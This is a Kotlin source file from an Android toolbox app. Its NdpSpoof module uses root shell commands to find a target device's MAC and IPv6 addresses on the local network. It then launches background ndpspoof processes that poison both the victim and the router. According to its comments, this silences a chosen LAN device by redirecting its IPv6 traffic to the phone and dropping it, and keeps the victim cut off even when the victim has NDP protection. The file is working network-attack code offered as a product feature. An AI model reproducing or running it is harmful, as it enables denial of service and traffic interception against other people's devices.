package com.installer.toolbox.core.network.scan

/**
 * IPv6 NDP 欺骗共享逻辑（静默 LanSilencer 与流量审计 TrafficAudit 共用）。
 *
 * 抽取自 LanSilencer（2026-08-14 实测验证过的实现，行为等价）：
 * 对单台目标启动全套 IPv6 欺骗进程：
 * - dir1 目标侧：宣称"IPv6 网关 = 手机"（对路由 via 地址与网关 MAC 的 EUI-64 两个地址各 1 个进程），
 *   目标 IPv6 上行引到手机丢弃；
 * - dir2 网关侧：宣称"目标全部 v6 地址 = 手机"（毒化路由器，最多 4 个地址：link-local+全局含隐私，
 *   MAC 派生的稳定地址兜底），目标 IPv6 下行引到手机丢弃——目标即使启用 NDP 防护，网关侧兜底仍断其下行。
 */
object NdpSpoof {

    /** spoofTarget 结果：victimMac=解析到的目标 MAC（记录重连侦测用），v6Procs=启动的 ndpspoof 进程数 */
    data class SpoofTargetResult(val victimMac: String?, val v6Procs: Int)

    /** IPv6 via 网关正则：`2400:3200::1 via fe80::1 dev wlan0 ...` */
    private val V6_VIA_RE = Regex("""via ([0-9a-fA-F]*:[0-9a-fA-F:]+)""")

    /** IPv6 link-local 地址正则 */
    private val LINK_LOCAL_V6_RE = Regex("""fe80:[0-9a-fA-F:]+""")

    /** MAC 地址格式 */
    private val MAC_RE = Regex("""([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}""")

    /** RootShell.run 失败文本判定 */
    fun isCmdFail(out: String): Boolean =
        out.startsWith("root 执行失败") || out.startsWith("命令退出码")

    /**
     * 对单台目标启动全套 IPv6 NDP 欺骗（dir1 双网关地址 + dir2 网关侧毒化）。
     * 任一步解析失败按降级跳过（如纯 IPv4 网络无 v6 网关 → 返回 v6Procs=0），不抛异常。
     *
     * @param gwV4 网关 IPv4（dir2 需要网关 MAC）
     * @param pids 收集启动的进程 PID（调用方统一管理清理）
     * @return victimMac（可能为 null=ARP 表里暂无该目标）+ v6Procs（成功启动的进程数）
     */
    fun spoofTarget(
        runner: (String) -> String,
        bin: String,
        iface: String,
        gwV4: String,
        targetV4: String,
        intervalMs: Int,
        pids: MutableList<Int>
    ): SpoofTargetResult {
        val vMac = victimMac(runner, targetV4)
        val phoneV6 = resolvePhoneV6(runner, iface) ?: return SpoofTargetResult(vMac, 0)
        // 目标侧要毒化的网关 v6 地址集合：路由 via 地址（fe80::1）+ 网关 MAC 的 EUI-64 link-local
        val gwV6 = resolveV6Gateway(runner)
        val gwMac = victimMac(runner, gwV4)
        val gwEui64 = gwMac?.let { macToEui64Groups(it) }
        val v6Gateways = listOfNotNull(gwV6, gwEui64?.let { "fe80::$it" }).distinct()
        if (v6Gateways.isEmpty() || vMac == null) return SpoofTargetResult(vMac, 0)

        val v6Addrs = victimV6Addresses(runner, iface, vMac)
        val vEui = macToEui64Groups(vMac)
        // 邻居表 link-local 优先；邻居表没有该目标（PDA/新设备未与目标通信过）则用 MAC 派生的稳定 link-local
        val v6 = v6Addrs.firstOrNull() ?: vEui?.let { "fe80::$it" } ?: return SpoofTargetResult(vMac, 0)

        var procs = 0
        // dir1：宣称"IPv6 网关 = 手机"
        for (g in v6Gateways) {
            procs += spawnOne(runner, bin, iface, vMac, v6, g, phoneV6, intervalMs, pids)
        }
        // dir2：毒化网关对目标每个 v6 地址的条目（link-local + 全局含隐私地址，最多 4 个）
        if (gwMac != null && gwEui64 != null) {
            val gwLink = "fe80::$gwEui64"
            val phonePrefix = resolvePhoneV6Prefix(runner, iface)
            val dir2Targets = (v6Addrs + listOfNotNull(
                vEui?.let { "fe80::$it" },
                if (vEui != null && phonePrefix != null) "$phonePrefix:$vEui" else null
            )).distinct().take(4)
            for (t in dir2Targets) {
                procs += spawnOne(runner, bin, iface, gwMac, gwLink, t, phoneV6, intervalMs, pids)
            }
        }
        return SpoofTargetResult(vMac, procs)
    }

    /** 后台启动一个 ndpspoof 进程并解析 PID 加入 [pids]；成功返回 1，失败返回 0 */
    private fun spawnOne(
        runner: (String) -> String,
        bin: String,
        iface: String,
        victimMac: String,
        victimV6: String,
        gatewayV6: String,
        phoneV6: String,
        intervalMs: Int,
        pids: MutableList<Int>
    ): Int {
        val out = try {
            runner("sh -c '$bin $iface $victimMac $victimV6 $gatewayV6 $phoneV6 $intervalMs >/dev/null 2>&1 & echo pid=\$!'")
        } catch (e: Exception) {
            return 0
        }
        return out.lineSequence()
            .mapNotNull { it.trim().removePrefix("pid=").toIntOrNull() }
            .firstOrNull()
            ?.let { pids += it; 1 } ?: 0
    }

    /**
     * 从 `ip neigh show <ip>` 解析目标真实 MAC（有 lladdr 即用，不要求 REACHABLE）；
     * 失败回退 /proc/net/arp 固定格式（放宽：非全零 MAC 即用——0x0 未确认条目也带历史 MAC）。
     */
    fun victimMac(runner: (String) -> String, ip: String): String? {
        val out = try { runner("ip neigh show $ip") } catch (e: Exception) { return null }
        if (!isCmdFail(out)) {
            macInNeighOutput(out, ip)?.let { return it }
        }
        val arp = try { runner("cat /proc/net/arp") } catch (e: Exception) { return null }
        if (!isCmdFail(arp)) {
            arp.lineSequence().forEach { line ->
                val f = line.trim().split(Regex("\\s+"))
                if (f.size >= 4 && f[0] == ip && MAC_RE.matches(f[3]) &&
                    !f[3].equals("00:00:00:00:00:00", ignoreCase = true)
                ) {
                    return f[3]
                }
            }
        }
        return null
    }

    /** 在 `ip neigh` 输出中找目标 IP 行的 lladdr MAC（行格式：`<ip> dev <iface> lladdr <mac> <state>`） */
    private fun macInNeighOutput(out: String, ip: String): String? {
        out.lineSequence().forEach { line ->
            val f = line.trim().split(Regex("\\s+"))
            if (f.size >= 2 && f[0] == ip) {
                MAC_RE.find(line)?.let { return it.value }
            }
        }
        return null
    }

    /**
     * 手机 IPv6 网关（link-local 或全局 v6）：逐级尝试 `ip -6 route get` / `ip route get`
     * / `ip -6 route show`（Android toybox 对 `-6` 选项与 v6 目标的解析支持不一，逐级兜底）。
     * 无 IPv6 路由（纯 IPv4 网络）返回 null，调用方整体跳过 IPv6 欺骗。
     */
    private fun resolveV6Gateway(runner: (String) -> String): String? {
        for (cmd in listOf(
            "ip -6 route get 2400:3200::1",
            "ip route get 2400:3200::1",
            "ip -6 route show"
        )) {
            val route = try { runner(cmd) } catch (e: Exception) { continue }
            if (isCmdFail(route)) continue
            V6_VIA_RE.find(route)?.let { return it.groupValues[1] }
        }
        return null
    }

    /**
     * 手机 IPv6 link-local：`ip -6 addr show dev <iface> scope link` 输出里第一个 fe80 地址；
     * toybox 不支持时回退全量 `ip addr show dev <iface>` 手工过滤。
     */
    private fun resolvePhoneV6(runner: (String) -> String, iface: String): String? {
        val out1 = try { runner("ip -6 addr show dev $iface scope link") } catch (e: Exception) { "" }
        if (!isCmdFail(out1)) {
            LINK_LOCAL_V6_RE.find(out1)?.let { return it.value }
        }
        val out2 = try { runner("ip addr show dev $iface") } catch (e: Exception) { "" }
        if (!isCmdFail(out2)) {
            LINK_LOCAL_V6_RE.find(out2)?.let { return it.value }
        }
        return null
    }

    /**
     * 目标 MAC 的全部 IPv6 地址（link-local 在前、全局在后，含隐私地址；dir2 网关侧毒化与
     * 流量审计的 IPv6 归属判定需要全部地址）。
     * 逐级数据源：① `ip -6 neigh show dev <iface>` ② `ip neigh show dev <iface>` ③ `cat /proc/net/ndisc`
     */
    fun victimV6Addresses(runner: (String) -> String, iface: String, victimMac: String): List<String> {
        for (cmd in listOf(
            "ip -6 neigh show dev $iface",
            "ip neigh show dev $iface",
            "cat /proc/net/ndisc"
        )) {
            val out = try { runner(cmd) } catch (e: Exception) { continue }
            if (isCmdFail(out)) continue
            val addrs = collectV6ByMac(out, victimMac)
            if (addrs.isNotEmpty()) return addrs
        }
        return emptyList()
    }

    /** 在邻居表输出中按 MAC 收集全部 IPv6 地址（link-local 优先排前，兼容 ip neigh 与 /proc/net/ndisc 两种格式） */
    private fun collectV6ByMac(out: String, victimMac: String): List<String> {
        val linkLocal = mutableListOf<String>()
        val globals = mutableListOf<String>()
        out.lineSequence().forEach { line ->
            val f = line.trim().split(Regex("\\s+"))
            if (f.size >= 2 && f.any { it.equals(victimMac, ignoreCase = true) }) {
                val addr = f[0]
                if (addr.contains(':') && !addr.contains('.')) {
                    if (addr.startsWith("fe80")) linkLocal += addr else globals += addr
                }
            }
        }
        return (linkLocal + globals).distinct()
    }

    /** MAC → EUI-64 接口标识（U/L 位翻转），如 "4008:93ff:fe59:510f" */
    private fun macToEui64Groups(mac: String): String? {
        val parts = mac.split(":")
        if (parts.size != 6) return null
        val b = IntArray(6)
        for (i in 0 until 6) b[i] = parts[i].toIntOrNull(16) ?: return null
        val first = b[0] xor 0x02
        return listOf(first, b[1], b[2], 0xff, 0xfe, b[3], b[4], b[5])
            .chunked(2)
            .joinToString(":") { pair -> pair.joinToString("") { "%02x".format(it) } }
    }

    /**
     * 手机全局 IPv6 的 /64 前缀（如 "240e:b80:fbb:f900"）：从 `ip -6 addr show dev <iface>`
     * 输出里找首个 scope global 的非 fe80 地址，取前 4 组。无全局 v6 返回 null。
     */
    private fun resolvePhoneV6Prefix(runner: (String) -> String, iface: String): String? {
        val globalRe = Regex("""inet6 ([0-9a-fA-F:]+)/64 scope global""")
        for (cmd in listOf("ip -6 addr show dev $iface", "ip addr show dev $iface")) {
            val out = try { runner(cmd) } catch (e: Exception) { continue }
            if (isCmdFail(out)) continue
            for (m in globalRe.findAll(out)) {
                val addr = m.groupValues[1]
                if (addr.startsWith("fe80")) continue
                val groups = addr.split(":")
                if (groups.size >= 4) {
                    val prefix = groups.take(4).joinToString(":")
                    if (Regex("""[0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){3}""").matches(prefix)) return prefix
                }
            }
        }
        return null
    }
}
